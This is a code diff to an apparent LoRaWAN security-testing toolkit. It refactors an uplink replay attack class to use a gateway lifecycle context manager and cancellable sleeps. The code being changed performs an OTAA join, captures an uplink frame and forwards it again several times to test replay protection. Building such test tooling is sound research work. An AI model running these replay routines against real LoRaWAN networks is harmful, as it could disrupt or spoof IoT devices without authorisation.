@@ -18,6 +18,8 @@ from lora_attack_toolkit.attacks.result import (
 from lora_attack_toolkit.attacks.analyzer import AttackAnalyzer
 from lora_attack_toolkit.attacks.packet_capture import PacketCapture
 from lora_attack_toolkit.attacks.validation import validate_criteria
+from lora_attack_toolkit.attacks.lifecycle import gateway_lifecycle
+from lora_attack_toolkit.lorawan.time_utils import interruptible_sleep
 from lora_attack_toolkit.lorawan.join import perform_otaa_join
 from lora_attack_toolkit.lorawan.mac_commands import (
     CID_DEVICE_TIME_ANS,
@@ -250,9 +252,11 @@ class UplinkReplayAttack(BaseAttack):
     # ── Enhanced path ─────────────────────────────────────────────────────────
 
     def _run_enhanced(self, ctx: AttackContext, cfg: UplinkReplayConfigV1) -> AttackResult:
-        ctx.gateway.start()
-        time.sleep(0.5)
+        with gateway_lifecycle(ctx.gateway):
+            interruptible_sleep(0.5, ctx.cancel_event)
+            return self._run_enhanced_body(ctx, cfg)
 
+    def _run_enhanced_body(self, ctx: AttackContext, cfg: UplinkReplayConfigV1) -> AttackResult:
         # 1. OTAA join
         t0 = time.monotonic()
         ctx.logger.info("Performing OTAA join... mono=%.3f", t0)
@@ -263,7 +267,6 @@ class UplinkReplayAttack(BaseAttack):
             timeout_sec=5.0,
             logger=ctx.logger,
         ):
-            ctx.gateway.stop()
             return AttackResult.failed(
                 attack_name=self.name,
                 attack_type="uplink_replay",
@@ -278,7 +281,7 @@ class UplinkReplayAttack(BaseAttack):
             "post_join_sleep interval_sec=%.3f mono=%.3f",
             cfg.uplink_interval_sec, join_mono,
         )
-        time.sleep(cfg.uplink_interval_sec)
+        interruptible_sleep(cfg.uplink_interval_sec, ctx.cancel_event)
 
         # 3. Warm-up: send clean uplinks until FCntUp reaches capture_fcnt
         device_time_req_bytes = encode_mac_commands([build_device_time_req()])
@@ -343,7 +346,7 @@ class UplinkReplayAttack(BaseAttack):
                     "uplink_interval_sleep interval_sec=%.3f next_mono=%.3f",
                     remaining_sleep, time.monotonic() + remaining_sleep,
                 )
-                time.sleep(remaining_sleep)
+                interruptible_sleep(remaining_sleep, ctx.cancel_event)
 
         # 4. Probe uplink at FCntUp == capture_fcnt
         probe_fcnt = ctx.device.runtime.fcnt_up  # == capture_fcnt
@@ -399,7 +402,7 @@ class UplinkReplayAttack(BaseAttack):
                     "replay_interval_sleep interval_sec=%.3f next_mono=%.3f",
                     cfg.replay_attempt_interval_sec, next_mono,
                 )
-                time.sleep(cfg.replay_attempt_interval_sec)
+                interruptible_sleep(cfg.replay_attempt_interval_sec, ctx.cancel_event)
                 replay_radio = _select_radio_for_uplink(ctx, captured.fcnt + i)
                 with gateway_lock:
                     tx_mono = time.monotonic()
@@ -422,7 +425,7 @@ class UplinkReplayAttack(BaseAttack):
                     "uplink_interval_sleep interval_sec=%.3f mono=%.3f",
                     cfg.uplink_interval_sec, sleep_start,
                 )
-                time.sleep(cfg.uplink_interval_sec)
+                interruptible_sleep(cfg.uplink_interval_sec, ctx.cancel_event)
                 # Drain accumulated MAC *Ans from _downlink_loop.
                 with mac_ans_lock:
                     ans_snapshot = pending_mac_ans[:]
@@ -521,11 +524,9 @@ class UplinkReplayAttack(BaseAttack):
         t_replay.join()
         t_normal.join()
         # Give RX windows time to drain after last TX
-        time.sleep(max(_DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec, 3.0))
+        interruptible_sleep(max(_DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec, 3.0), ctx.cancel_event)
         stop_dl_event.set()
         t_dl.join(timeout=2.0)
-
-        ctx.gateway.stop()
 
         # 9–11. Analyse
         return self._analyze_enhanced(
@@ -672,72 +673,71 @@ class UplinkReplayAttack(BaseAttack):
         payload_hex = config.capture_phase.payload_hex or "CAFEBABE"
 
         ctx.logger.info("Starting gateway...")
-        ctx.gateway.start()
-        time.sleep(0.5)
+        with gateway_lifecycle(ctx.gateway):
+            interruptible_sleep(0.5, ctx.cancel_event)
 
-        if perform_join:
-            ctx.logger.info("Performing OTAA join...")
-            join_success = perform_otaa_join(
-                device=ctx.device,
-                gateway=ctx.gateway,
-                radio=ctx.radio,
-                timeout_sec=5.0,
-                logger=ctx.logger,
-            )
-            if not join_success:
-                return AttackResult.failed(
-                    attack_name=self.name,
-                    attack_type="uplink_replay",
-                    error="OTAA join failed",
-                    message="OTAA join failed - cannot proceed with replay",
+            if perform_join:
+                ctx.logger.info("Performing OTAA join...")
+                join_success = perform_otaa_join(
+                    device=ctx.device,
+                    gateway=ctx.gateway,
+                    radio=ctx.radio,
+                    timeout_sec=5.0,
+                    logger=ctx.logger,
                 )
-            ctx.logger.info("OTAA join successful")
+                if not join_success:
+                    return AttackResult.failed(
+                        attack_name=self.name,
+                        attack_type="uplink_replay",
+                        error="OTAA join failed",
+                        message="OTAA join failed - cannot proceed with replay",
+                    )
+                ctx.logger.info("OTAA join successful")
 
-        ctx.logger.info("Sending original uplink...")
-        payload = bytes.fromhex(payload_hex)
-        original_uplink = ctx.device.build_data_uplink(
-            payload=payload, f_port=10, confirmed=False
-        )
-        tx_mono = time.monotonic()
-        ctx.gateway.forward_uplink(original_uplink, ctx.radio)
-        fcnt_original = ctx.device.runtime.fcnt_up - 1
-        ctx.capture.capture_uplink(
-            phy_payload=original_uplink,
-            fcnt=fcnt_original,
-            packet_type="data_up",
-        )
-        ctx.logger.info(
-            "original_uplink_sent fcnt=%d mono=%.3f", fcnt_original, tx_mono
-        )
-
-        delay_start = time.monotonic()
-        ctx.logger.info(
-            "replay_delay_start delay_sec=%.3f mono=%.3f", replay_delay, delay_start
-        )
-        time.sleep(replay_delay)
-        delay_elapsed_ms = (time.monotonic() - delay_start) * 1000
-        ctx.logger.info(
-            "replay_delay_done elapsed_ms=%.0f mono=%.3f",
-            delay_elapsed_ms, time.monotonic(),
-        )
-
-        ctx.logger.info(f"Replaying uplink {replay_count} time(s)...")
-        for i in range(replay_count):
-            t_replay = time.monotonic()
+            ctx.logger.info("Sending original uplink...")
+            payload = bytes.fromhex(payload_hex)
+            original_uplink = ctx.device.build_data_uplink(
+                payload=payload, f_port=10, confirmed=False
+            )
+            tx_mono = time.monotonic()
             ctx.gateway.forward_uplink(original_uplink, ctx.radio)
+            fcnt_original = ctx.device.runtime.fcnt_up - 1
             ctx.capture.capture_uplink(
                 phy_payload=original_uplink,
-                fcnt=ctx.device.runtime.fcnt_up - 1,
+                fcnt=fcnt_original,
                 packet_type="data_up",
             )
             ctx.logger.info(
-                "replay_sent attempt=%d/%d mono=%.3f", i + 1, replay_count, t_replay
+                "original_uplink_sent fcnt=%d mono=%.3f", fcnt_original, tx_mono
             )
-            if i < replay_count - 1:
-                time.sleep(0.1)
 
-        ctx.logger.info(f"Replay attack complete: {replay_count} replay(s) sent")
-        ctx.gateway.stop()
+            delay_start = time.monotonic()
+            ctx.logger.info(
+                "replay_delay_start delay_sec=%.3f mono=%.3f", replay_delay, delay_start
+            )
+            interruptible_sleep(replay_delay, ctx.cancel_event)
+            delay_elapsed_ms = (time.monotonic() - delay_start) * 1000
+            ctx.logger.info(
+                "replay_delay_done elapsed_ms=%.0f mono=%.3f",
+                delay_elapsed_ms, time.monotonic(),
+            )
+
+            ctx.logger.info("Replaying uplink %d time(s)...", replay_count)
+            for i in range(replay_count):
+                t_replay_mono = time.monotonic()
+                ctx.gateway.forward_uplink(original_uplink, ctx.radio)
+                ctx.capture.capture_uplink(
+                    phy_payload=original_uplink,
+                    fcnt=ctx.device.runtime.fcnt_up - 1,
+                    packet_type="data_up",
+                )
+                ctx.logger.info(
+                    "replay_sent attempt=%d/%d mono=%.3f", i + 1, replay_count, t_replay_mono
+                )
+                if i < replay_count - 1:
+                    interruptible_sleep(0.1, ctx.cancel_event)
+
+            ctx.logger.info("Replay attack complete: %d replay(s) sent", replay_count)
 
         ctx.logger.info("Analyzing results...")
         analyzer = ReplayAnalyzer()
